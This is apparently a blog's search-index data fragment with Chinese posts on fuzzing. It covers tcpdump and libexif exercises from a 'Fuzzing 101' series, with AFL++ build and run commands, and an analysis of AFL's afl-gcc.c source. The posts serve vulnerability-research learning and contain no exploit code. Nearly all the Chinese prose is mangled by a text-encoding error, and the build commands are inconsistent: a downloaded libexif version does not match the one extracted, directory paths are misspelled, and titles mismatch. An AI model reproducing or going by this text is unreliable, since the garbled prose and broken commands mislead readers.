é€‰é¡¹æ˜¯å–æ¶ˆäº†AFLçš„å†…å­˜ä½¿ç”¨é™åˆ¶ï¼Œå› ä¸ºåœ¨64-bitç³»ç»Ÿä¸‹ï¼ŒASANä¼šå ç”¨è¾ƒå¤šçš„å†…å­˜ã€‚ ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"3. Crashes æœ€ç»ˆè·‘å¾—çš„ç»“æœå¦‚ä¸‹ï¼š ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"4. Triage å¯¹ä½¿ç”¨äº†ASAN è¿›è¡Œbuildçš„ç¨‹åºè¿›è¡Œdebugæ˜¯ä¸€ä»¶ååˆ†å®¹æ˜“çš„äº‹æƒ…ï¼Œåªè¦ç›´æ¥å°†crashæ–‡ä»¶å–‚ç»™ç¨‹åºè¿è¡Œå³å¯ï¼Œç„¶åå°±å¯ä»¥å¾—åˆ°crashçš„ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬å‡½æ•°çš„æ‰§è¡Œè¿½è¸ªï¼š ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"5. Fix å®˜æ–¹çš„ä¿®å¤åœ°å€ï¼š https://github.com/the-tcpdump-group/tcpdump/commit/29e5470e6ab84badbc31f4532bb7554a796d9d52 åç»­å°†å¯¹è¯¥æ¼æ´è¿›è¡Œæ·±å…¥åˆ†æå’Œè¡¥ä¸åˆ†æï¼Œå¾…å®Œå–„ã€‚ ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:5:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"Fuzzing 101 ç³»åˆ— note 3","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"Fuzzing 101 â€“ 2 æœ¬æ–‡æ˜¯Fuzzing101ç³»åˆ—ç¬¬äºŒç¯‡ï¼Œfuzzçš„å¯¹è±¡ä¸ºlibexifåº“ã€‚ ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics libexif CVE-2009-3895, CVE-2012-2836 3hous aft-clang-lto, fuzz libraries, Eclipse IDE CVE-2009-3895: heap-based buffer overflow vulnerability. CVE-2012-2836: out-of-bounds read vulnerability. ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"2. Learning Target å¦‚ä½•å¯¹ä½¿ç”¨äº†å¤–éƒ¨åº“çš„åº”ç”¨è¿›è¡Œfuzz ä½¿ç”¨ afl-clang-lto è¿›è¡Œfuzzï¼Œå®ƒæ¯” afl-clang-fast çš„é€Ÿåº¦æ›´å¿« ä½¿ç”¨ Eclipse IDEè¿›è¡ŒåŠ¨æ€è°ƒè¯• ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"1. Workflow å¯»æ‰¾ä½¿ç”¨äº† libexif åº“çš„åº”ç”¨æ¥å£ åˆ›å»º exif æ ·ä¾‹çš„ç§å­è¯­æ–™åº“ ä½¿ç”¨ afl-clang-lto ç¼–è¯‘ libexif å’Œé€‰æ‹©çš„åº”ç”¨ç¨‹åº å¯¹ libexif è¿›è¡Œfuzz å¯¹ crash è¿›è¡Œåˆ†ç±»è¿‡æ»¤ï¼Œç¡®è®¤æ¯ä¸ªæ¼æ´çš„ PoC ä¿®å¤æ¼æ´ ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target é¦–å…ˆåˆ›å»ºå¾…fuzzçš„ libexif ç¯å¢ƒï¼Œè¿›è¡Œç¼–è¯‘å¾…ç”¨ï¼š # download wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_14-release.tar.gz tar -xzvf libexif-0_6_15-release.tar.gz # build and install libexif cd libexif-libexif-0_6_15-release/ sudo apt install autopoint libtool gettext libpopt-dev autoreconf -fvi ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_libexif/install/\" make make install # choosing an interface application wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz tar -xzvf exif-0_6_15-release.tar.gz # build and install exif command-line utility cd .. cd exif-exif-0_6_15-release/ autoreconf -fvi ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/traning/fuzzing_libexif/install/\" PKG_CONFIG_PATH=$HOME/Desktop/Fuzz/traning/fuzzing_libexif/install/lib/pkgconfig make make install å¤‡æ³¨ï¼šè¿™é‡Œçš„libexifçš„ç‰ˆæœ¬æœ€å¥½é€‰ç”¨ 0_6_15 ç‰ˆæœ¬ï¼Œ14çš„ç‰ˆæœ¬make installä¼šä¸€ç›´æŠ¥é”™ï¼Œè€Œä¸”æ²¡æœ‰å‡ºç°è¿‡å®˜æ–¹issueã€‚ä¸ºèŠ‚çœæ—¶é—´ï¼Œæ›´æ¢äº†ç‰ˆæœ¬ã€‚ 2. Seed corpus creation åˆ›å»ºç§å­è¯­æ–™åº“ï¼Œè¿™é‡Œé€‰ç”¨çš„æ˜¯githubä¸Šå…¬å¼€çš„ä¸€ä¸ªexifçš„æ ·ä¾‹åº“ï¼šhttps://github.com/ianare/exif-samplesã€‚ # download and unzip cd $HOME/Desktop/Fuzz/training/fuzzing_libexif wget https://github.com/ianare/exif-samples/archive/refs/heads/master.zip unzip master.zip å®‰è£…å®Œæˆåï¼Œä½¿ç”¨ exif æ£€æµ‹ä¸€ä¸‹æ ·æœ¬ï¼Œå¯ä»¥æˆåŠŸè¯†åˆ«å³å¯ã€‚ 3. aft-clang-lto instrumentation ä½¿ç”¨ afl-clang-lto é‡æ–°å¯¹ libexif å’Œ exif è¿›è¡Œç¼–è¯‘ï¼š # recompile libexif with afl-clang-lto rm -r $HOME/Desktop/Fuzz/training/fuzzing_libexif/install cd $HOME/Desktop/Fuzz/training/fuzzing_libexif/libexif-libexif-0_6_15-release/ make clean export LLVM_CONFIG=\"llvm-config-12\" # llvm-config-version at least is 11 CC=afl-clang-lto ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_libexif/install/\" make make install # recompile exif with afl-clang-lto cd $HOME/fuzzing_libexif/exif-exif-0_6_15-release make clean export LLVM_CONFIG=\"llvm-config-12\" CC=afl-clang-lto ./configure --enable-shared=no --prefix=\"$HOME/fuzzing_libexif/install/\" PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig make make install 4. Start fuzz ç¼–è¯‘å®Œæˆåï¼Œå¯ä»¥ä½¿ç”¨afl++åœ¨ afl-clang-lto æ¨¡å¼ä¸‹å¼€å§‹è¿›è¡Œfuzzï¼š afl-fuzz -i $HOME/Desktop/Fuzz/training/fuzzing_libexif/exif-samples-master/jpg/ -o $HOME/Desktop/Fuzz/training/fuzzing_libexif/out/ -s 123 -- $HOME/Desktop/Fuzz/training/fuzzing_libexif/install/bin/exif @@ ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"3. Crashes æœ€ç»ˆè·‘å¾—çš„ç»“æœå¦‚ä¸‹ï¼ˆå› ä¸ºè‡ªåŠ¨è·‘çš„ï¼Œæ‰€ä»¥cycleè¶…äº†ï¼‰ï¼š ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"4. Debug ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"1. Eclipse setup # install java sudo apt install default-jdk # download and run Eclipse wget https://download.eclipse.org/technology/epp/downloads/release/2021-06/R/eclipse-cpp-2021-06-R-linux-gtk-x86_64.tar.gz tar -zxvf eclipse-cpp-2021-06-R-linux-gtk-x86_64.tar.gz è§£å‹å®Œæˆåï¼Œè¿›å…¥æ–‡ä»¶å¤¹ï¼Œè¿è¡Œ eclipse å³å¯ã€‚ å¯¼å…¥é¡¹ç›®ï¼šé€‰æ‹© FileÂ -\u003eÂ ImportÂ ï¼Œ ç„¶åé€‰æ‹© C/C++ é‡Œçš„ ExistingÂ codeÂ asÂ makefileÂ project ã€‚ç„¶åé€‰æ‹© LinuxÂ GCC ï¼Œå¹¶é€‰æ‹©ä»£ç è·¯å¾„ã€‚ è°ƒè¯•ï¼šé€‰æ‹© runÂ -\u003eÂ DebugÂ Configurationsï¼Œç„¶åé€‰æ‹©exifé¡¹ç›®å¹¶ä¸”é€‰å®šexif å¯æ‰§è¡Œç¨‹åºï¼Œç„¶åè®¾ç½® Arguments ä¸­ä¸ºcrash çš„ç»å¯¹è·¯å¾„åï¼Œæœ€åç‚¹å‡» Debug å³å¯ã€‚è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œç›´æ¥ F8 æˆ–è€… runÂ -\u003eÂ Resume å¯ä»¥ç›´æ¥æ¥åˆ°crash ç°åœºã€‚ 2. Eclipse crash debug æœ€åå°±æ˜¯ä½¿ç”¨Eclipseè¿›è¡Œcrashçš„debugäº†ï¼Œè¿™ä¸ªå°±ä¸åšè®°å½•äº†ï¼Œéœ€è¦èŠ±æ—¶é—´è°ƒè¯•æ¯ä¸ªcrashæ–‡ä»¶ã€‚ ","date":"2021-01-11","objectID":"/2021/01/fuzzing101-2/:4:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-2/"},{"categories":["Fuzz"],"content":"AFLäºŒä¸‰äº‹ç³»åˆ— note 3","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"æœ¬æ–‡æ˜¯AFLç³»åˆ—ç¬¬å››ç¯‡ï¼Œä¸»è¦ä»‹ç»AFLçš„æºç åˆ†æã€‚ AFLäºŒä¸‰äº‹â€”â€”æºç åˆ†æ ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:0:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"å‰è¨€ AFLï¼Œå…¨ç§°â€œAmerican Fuzzy Lopâ€ï¼Œæ˜¯ç”±å®‰å…¨ç ”ç©¶å‘˜Michal Zalewskiå¼€å‘çš„ä¸€æ¬¾åŸºäºè¦†ç›–å¼•å¯¼ï¼ˆCoverage-guidedï¼‰çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œå®ƒé€šè¿‡è®°å½•è¾“å…¥æ ·æœ¬çš„ä»£ç è¦†ç›–ç‡ï¼ˆä»£ç æ‰§è¡Œè·¯å¾„çš„è¦†ç›–æƒ…å†µï¼‰ï¼Œä»¥æ­¤è¿›è¡Œåé¦ˆï¼Œå¯¹è¾“å…¥æ ·æœ¬è¿›è¡Œè°ƒæ•´ä»¥æé«˜è¦†ç›–ç‡ï¼Œä»è€Œæå‡å‘ç°æ¼æ´çš„å¯èƒ½æ€§ã€‚AFLå¯ä»¥é’ˆå¯¹æœ‰æºç å’Œæ— æºç çš„ç¨‹åºè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œå…¶è®¾è®¡æ€æƒ³å’Œå®ç°æ–¹æ¡ˆåœ¨æ¨¡ç³Šæµ‹è¯•é¢†åŸŸå…·æœ‰ååˆ†é‡è¦çš„æ„ä¹‰ã€‚ æ·±å…¥åˆ†æAFLæºç ï¼Œå¯¹ç†è§£AFLçš„è®¾è®¡ç†å¿µå’Œå…¶ä¸­ç”¨åˆ°çš„æŠ€å·§æœ‰ç€å·¨å¤§çš„å¸®åŠ©ï¼Œå¯¹äºåæœŸè¿›è¡Œå®šåˆ¶åŒ–Fuzzerå¼€å‘ä¹Ÿå…·æœ‰æ·±åˆ»çš„æŒ‡å¯¼æ„ä¹‰ã€‚æ‰€ä»¥ï¼Œé˜…è¯»AFLæºç æ˜¯å­¦ä¹ AFLå¿…ä¸å¯å°‘çš„ä¸€ä¸ªå…³é”®æ­¥éª¤ã€‚ ï¼ˆæ³¨ï¼šéœ€è¦å¼ºè°ƒçš„æ˜¯ï¼Œæœ¬æ–‡çš„ä¸»è¦ç›®çš„æ˜¯ååŠ©fuzzçˆ±å¥½è€…é˜…è¯»AFLçš„æºç ï¼Œæ‰€ä»¥éœ€è¦åœ¨äº†è§£AFLåŸºæœ¬å·¥ä½œæµç¨‹å’ŒåŸç†çš„å‰æä¸‹è¿›è¡Œé˜…è¯»ï¼Œæœ¬æ–‡å¹¶ä¸ä¼šåœ¨åŸç†ä¾§åšè¿‡å¤šè¯´æ˜ã€‚ï¼‰ å½“åˆ«äººéƒ½è¦å¿«çš„æ—¶å€™ï¼Œä½ è¦æ…¢ä¸‹æ¥ã€‚ ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:1:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"å®è§‚ é¦–å…ˆåœ¨å®è§‚ä¸Šçœ‹ä¸€ä¸‹AFLçš„æºç ç»“æ„ï¼š ä¸»è¦çš„ä»£ç åœ¨ afl-fuzz.c æ–‡ä»¶ä¸­ï¼Œç„¶åæ˜¯å‡ ä¸ªç‹¬ç«‹æ¨¡å—çš„å®ç°ä»£ç ï¼Œllvm_mode å’Œ qemu_mode çš„ä»£ç é‡å¤§è‡´ç›¸å½“ï¼Œæ‰€ä»¥åˆ†æçš„é‡ç‚¹åº”è¯¥è¿˜æ˜¯åœ¨AFLçš„æ ¹ç›®å½•ä¸‹çš„å‡ ä¸ªæ ¸å¿ƒåŠŸèƒ½çš„å®ç°ä¸Šï¼Œå°¤å…¶æ˜¯ afl-fuzz.cï¼Œå±äºæ ¸å¿ƒä¸­çš„é‡ç‚¹ã€‚ å„ä¸ªæ¨¡å—çš„ä¸»è¦åŠŸèƒ½å’Œä½œç”¨çš„ç®€è¦è¯´æ˜ï¼š æ’æ¡©æ¨¡å— afl-as.h,Â afl-as.c,Â afl-gcc.cï¼šæ™®é€šæ’æ¡©æ¨¡å¼ï¼Œé’ˆå¯¹æºç æ’æ¡©ï¼Œç¼–è¯‘å™¨å¯ä»¥ä½¿ç”¨gccï¼Œ clangï¼› llvm_modeï¼šllvm æ’æ¡©æ¨¡å¼ï¼Œé’ˆå¯¹æºç æ’æ¡©ï¼Œç¼–è¯‘å™¨ä½¿ç”¨clangï¼› qemu_modeï¼šqemu æ’æ¡©æ¨¡å¼ï¼Œé’ˆå¯¹äºŒè¿›åˆ¶æ–‡ä»¶æ’æ¡©ã€‚ fuzzer æ¨¡å— afl-fuzz.cï¼šfuzzer å®ç°çš„æ ¸å¿ƒä»£ç ï¼ŒAFL çš„ä¸»ä½“ã€‚ å…¶ä»–è¾…åŠ©æ¨¡å— afl-analyzeï¼šå¯¹æµ‹è¯•ç”¨ä¾‹è¿›è¡Œåˆ†æï¼Œé€šè¿‡åˆ†æç»™å®šçš„ç”¨ä¾‹ï¼Œç¡®å®šæ˜¯å¦å¯ä»¥å‘ç°ç”¨ä¾‹ä¸­æœ‰æ„ä¹‰çš„å­—æ®µï¼› afl-plotï¼šç”Ÿæˆæµ‹è¯•ä»»åŠ¡çš„çŠ¶æ€å›¾ï¼› afl-tminï¼šå¯¹æµ‹è¯•ç”¨ä¾‹è¿›è¡Œæœ€å°åŒ–ï¼› afl-cminï¼šå¯¹è¯­æ–™åº“è¿›è¡Œç²¾ç®€æ“ä½œï¼› afl-showmapï¼šå¯¹å•ä¸ªæµ‹è¯•ç”¨ä¾‹è¿›è¡Œæ‰§è¡Œè·¯å¾„è·Ÿè¸ªï¼› afl-whatsupï¼šå„å¹¶è¡Œä¾‹ç¨‹fuzzingç»“æœç»Ÿè®¡ï¼› afl-gotcpuï¼šæŸ¥çœ‹å½“å‰CPUçŠ¶æ€ã€‚ éƒ¨åˆ†å¤´æ–‡ä»¶è¯´æ˜ alloc-inl.hï¼šå®šä¹‰å¸¦æ£€æµ‹åŠŸèƒ½çš„å†…å­˜åˆ†é…å’Œé‡Šæ”¾æ“ä½œï¼› config.hï¼šå®šä¹‰é…ç½®ä¿¡æ¯ï¼› debug.hï¼šä¸æç¤ºä¿¡æ¯ç›¸å…³çš„å®å®šä¹‰ï¼› hash.hï¼šå“ˆå¸Œå‡½æ•°çš„å®ç°å®šä¹‰ï¼› types.hï¼šéƒ¨åˆ†ç±»å‹åŠå®çš„å®šä¹‰ã€‚ ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:2:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"ä¸€ã€AFLçš„æ’æ¡©â€”â€”æ™®é€šæ’æ¡© ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:3:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"ï¼ˆä¸€ï¼‰ ã€AFL çš„ gcc â€”â€” afl-gcc.c 1. æ¦‚è¿° afl-gcc æ˜¯GCC æˆ– clang çš„ä¸€ä¸ªwrapperï¼ˆå°è£…ï¼‰ï¼Œå¸¸è§„çš„ä½¿ç”¨æ–¹æ³•æ˜¯åœ¨è°ƒç”¨ ./configure æ—¶é€šè¿‡ CC å°†è·¯å¾„ä¼ é€’ç»™ afl-gcc æˆ– afl-clangã€‚ï¼ˆå¯¹äº C++ ä»£ç ï¼Œåˆ™ä½¿ç”¨ CXX å¹¶å°†å…¶æŒ‡å‘ afl-g++ / afl-clang++ã€‚ï¼‰afl-clang, afl-clang++ï¼Œ afl-g++ å‡ä¸ºæŒ‡å‘ afl-gcc çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ã€‚ afl-gcc çš„ä¸»è¦ä½œç”¨æ˜¯å®ç°å¯¹äºå…³é”®èŠ‚ç‚¹çš„ä»£ç æ’æ¡©ï¼Œå±äºæ±‡ç¼–çº§ï¼Œä»è€Œè®°å½•ç¨‹åºæ‰§è¡Œè·¯å¾„ä¹‹ç±»çš„å…³é”®ä¿¡æ¯ï¼Œå¯¹ç¨‹åºçš„è¿è¡Œæƒ…å†µè¿›è¡Œåé¦ˆã€‚ 2. æºç  1. å…³é”®å˜é‡ åœ¨å¼€å§‹å‡½æ•°ä»£ç åˆ†æå‰ï¼Œé¦–å…ˆè¦æ˜ç¡®å‡ ä¸ªå…³é”®å˜é‡ï¼š static u8* as_path; /* Path to the AFL 'as' wrapperï¼ŒAFLçš„asçš„è·¯å¾„ */ static u8** cc_params; /* Parameters passed to the real CCï¼ŒCCå®é™…ä½¿ç”¨çš„ç¼–è¯‘å™¨å‚æ•° */ static u32 cc_par_cnt = 1; /* Param count, including argv0 ï¼Œå‚æ•°è®¡æ•° */ static u8 be_quiet, /* Quiet modeï¼Œé™é»˜æ¨¡å¼ */ clang_mode; /* Invoked as afl-clang*? ï¼Œæ˜¯å¦ä½¿ç”¨afl-clang*æ¨¡å¼ */ # æ•°æ®ç±»å‹è¯´æ˜ # typedef uint8_t u8; # typedef uint16_t u16; # typedef uint32_t u32; 2. mainå‡½æ•° main å‡½æ•°å…¨éƒ¨é€»è¾‘å¦‚ä¸‹ï¼š å…¶ä¸­ä¸»è¦æœ‰å¦‚ä¸‹ä¸‰ä¸ªå‡½æ•°çš„è°ƒç”¨ï¼š find_as(argv[0]) ï¼šæŸ¥æ‰¾ä½¿ç”¨çš„æ±‡ç¼–å™¨ edit_params(argc, argv)ï¼šå¤„ç†ä¼ å…¥çš„ç¼–è¯‘å‚æ•°ï¼Œå°†ç¡®å®šå¥½çš„å‚æ•°æ”¾å…¥ cc_params[] æ•°ç»„ è°ƒç”¨ execvp(cc_params[0], (cahr**)cc_params) æ‰§è¡Œ afl-gcc è¿™é‡Œæ·»åŠ äº†éƒ¨åˆ†ä»£ç æ‰“å°å‡ºä¼ å…¥çš„å‚æ•° arg[0] - arg[7] ï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†æ˜¯æˆ‘ä»¬æŒ‡å®šçš„å‚æ•°ï¼Œå¦å¤–ä¸€éƒ¨åˆ†æ˜¯è‡ªåŠ¨æ·»åŠ çš„ç¼–è¯‘é€‰é¡¹ã€‚ 3. find_as å‡½æ•° å‡½æ•°çš„æ ¸å¿ƒä½œç”¨ï¼šå¯»æ‰¾ afl-as å‡½æ•°å†…éƒ¨å¤§æ¦‚çš„æµç¨‹å¦‚ä¸‹ï¼ˆè½¯ä»¶è‡ªåŠ¨ç”Ÿæˆï¼Œæ§åˆ¶æµç¨‹å›¾å­˜åœ¨è¯¯å·®ï¼Œä½†å…³é”®é€»è¾‘æ²¡æœ‰é—®é¢˜ï¼‰ï¼š é¦–å…ˆæ£€æŸ¥ç¯å¢ƒå˜é‡ AFL_PATH ï¼Œå¦‚æœå­˜åœ¨ç›´æ¥èµ‹å€¼ç»™ afl_path ï¼Œç„¶åæ£€æŸ¥ afl_path/as æ–‡ä»¶æ˜¯å¦å¯ä»¥è®¿é—®ï¼Œå¦‚æœå¯ä»¥ï¼Œas_pathÂ =Â afl_pathã€‚ å¦‚æœä¸å­˜åœ¨ç¯å¢ƒå˜é‡ AFL_PATH ï¼Œæ£€æŸ¥ argv[0] ï¼ˆå¦‚â€œ/Users/v4ler1an/AFL/afl-gccâ€ï¼‰ä¸­æ˜¯å¦å­˜åœ¨ â€œ/â€ ï¼Œå¦‚æœå­˜åœ¨åˆ™å–æœ€åâ€œ/â€ å‰é¢çš„å­—ç¬¦ä¸²ä½œä¸º dirï¼Œç„¶åæ£€æŸ¥ dir/afl-as æ˜¯å¦å¯ä»¥è®¿é—®ï¼Œå¦‚æœå¯ä»¥ï¼Œå°† as_path =Â dir ã€‚ ä»¥ä¸Šä¸¤ç§æ–¹å¼éƒ½å¤±è´¥ï¼ŒæŠ›å‡ºå¼‚å¸¸ã€‚ 4. edit_params å‡½æ•° æ ¸å¿ƒä½œç”¨ï¼šå°† argv æ‹·è´åˆ° u8 **cc_params ï¼Œç„¶åè¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚ å‡½æ•°å†…éƒ¨çš„å¤§æ¦‚æµç¨‹å¦‚ä¸‹ï¼š è°ƒç”¨ ch_alloc() ä¸º cc_params åˆ†é…å¤§å°ä¸º (argc + 128)Â *Â 8 çš„å†…å­˜ï¼ˆu8çš„ç±»å‹ä¸º1byteæ— ç¬¦å·æ•´æ•°ï¼‰ æ£€æŸ¥ argv[0] ä¸­æ˜¯å¦å­˜åœ¨/ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ nameÂ = argv[0]ï¼Œå¦‚æœå­˜åœ¨åˆ™ä¸€ç›´æ‰¾åˆ°æœ€åä¸€ä¸ª/ï¼Œå¹¶å°†å…¶åé¢çš„å­—ç¬¦ä¸²èµ‹å€¼ç»™ name å¯¹æ¯” nameå’Œå›ºå®šå­—ç¬¦ä¸²afl-clangï¼š è‹¥ç›¸åŒï¼Œè®¾ç½®clang_mode =Â 1ï¼Œè®¾ç½®ç¯å¢ƒå˜é‡CLANG_ENV_VARä¸º1 å¯¹æ¯”nameå’Œå›ºå®šå­—ç¬¦ä¸²afl-clang++:ï¼š è‹¥ç›¸åŒï¼Œåˆ™è·å–ç¯å¢ƒå˜é‡AFL_CXXçš„å€¼ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å°†è¯¥å€¼èµ‹å€¼ç»™cc_params[0]ï¼Œå¦åˆ™å°†afl-clang++èµ‹å€¼ç»™cc_params[0]ã€‚è¿™é‡Œçš„cc_paramsä¸ºä¿å­˜ç¼–è¯‘å‚æ•°çš„æ•°ç»„ï¼› è‹¥ä¸ç›¸åŒï¼Œåˆ™è·å–ç¯å¢ƒå˜é‡AFL_CCçš„å€¼ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å°†è¯¥å€¼èµ‹å€¼ç»™cc_params[0]ï¼Œå¦åˆ™å°†afl-clangèµ‹å€¼ç»™cc_params[0]ã€‚ å¦‚æœä¸ç›¸åŒï¼Œå¹¶ä¸”æ˜¯Appleå¹³å°ï¼Œä¼šè¿›å…¥ #ifdef __APPLE__ã€‚åœ¨Appleå¹³å°ä¸‹ï¼Œå¼€å§‹å¯¹ name è¿›è¡Œå¯¹æ¯”ï¼Œå¹¶é€šè¿‡ cc_params[0] = getenv(\"\") å¯¹cc_params[0]è¿›è¡Œèµ‹å€¼ï¼›å¦‚æœæ˜¯éAppleå¹³å°ï¼Œå¯¹æ¯” name å’Œ å›ºå®šå­—ç¬¦ä¸²afl-g++ï¼ˆæ­¤å¤„å¿½ç•¥å¯¹Javaç¯å¢ƒçš„å¤„ç†è¿‡ç¨‹ï¼‰ï¼š è‹¥ç›¸åŒï¼Œåˆ™è·å–ç¯å¢ƒå˜é‡AFL_CXXçš„å€¼ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å°†è¯¥å€¼èµ‹å€¼ç»™cc_params[0]ï¼Œå¦åˆ™å°†g++èµ‹å€¼ç»™cc_params[0]ï¼› è‹¥ä¸ç›¸åŒï¼Œåˆ™è·å–ç¯å¢ƒå˜é‡AFL_CCçš„å€¼ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å°†è¯¥å€¼èµ‹å€¼ç»™cc_params[0]ï¼Œå¦åˆ™å°†gccèµ‹å€¼ç»™cc_params[0]ã€‚ è¿›å…¥ while å¾ªç¯ï¼Œéå†ä»argv[1]å¼€å§‹çš„argvå‚æ•°ï¼š å¦‚æœæ‰«æåˆ° -B ï¼Œ-Bé€‰é¡¹ç”¨äºè®¾ç½®ç¼–è¯‘å™¨çš„æœç´¢è·¯å¾„ï¼Œç›´æ¥è·³è¿‡ã€‚ï¼ˆå› ä¸ºåœ¨è¿™ä¹‹å‰å·²ç»å¤„ç†è¿‡as_pathäº†ï¼‰ï¼› å¦‚æœæ‰«æåˆ° -integrated-asï¼Œè·³è¿‡ï¼› å¦‚æœæ‰«æåˆ° -pipeï¼Œè·³è¿‡ï¼› å¦‚æœæ‰«æåˆ° -fsanitize=address å’Œ -fsanitize=memory å‘Šè¯‰ gcc æ£€æŸ¥å†…å­˜è®¿é—®çš„é”™è¯¯ï¼Œæ¯”å¦‚æ•°ç»„è¶Šç•Œä¹‹ç±»ï¼Œè®¾ç½® asan_set = 1ï¼› å¦‚æœæ‰«æåˆ° FORTIFY_SOURCE ï¼Œè®¾ç½® fortify_set = 1 ã€‚FORTIFY_SOURCE ä¸»è¦è¿›è¡Œç¼“å†²åŒºæº¢å‡ºé—®é¢˜çš„æ£€æŸ¥ï¼Œæ£€æŸ¥çš„å¸¸è§å‡½æ•°æœ‰memcpy, mempcpy, memmove, memset, strcpy, stpcpy, strncpy, strcat, strncat, sprintf, vsprintf, snprintf, gets ç­‰ï¼› å¯¹ cc_params è¿›è¡Œèµ‹å€¼ï¼šcc_params[cc_par_cnt++]Â = cur; è·³å‡º while å¾ªç¯ï¼Œè®¾ç½®å…¶ä»–å‚æ•°ï¼š å–å‡ºå‰é¢è®¡ç®—å‡ºçš„ as_path ï¼Œè®¾ç½® -BÂ as_path ï¼› å¦‚æœä¸º clang_mode ï¼Œåˆ™è®¾ç½®-no-integrated-asï¼› 3. å¦‚æœå­˜åœ¨ç¯å¢ƒå˜é‡ AFL_HARDENï¼Œåˆ™è®¾ç½®-fstack-protector-allã€‚ä¸”å¦‚æœæ²¡æœ‰è®¾ç½® fortify_set ï¼Œè¿½åŠ  -D_FORTIFY_SOURCE=2 ï¼› 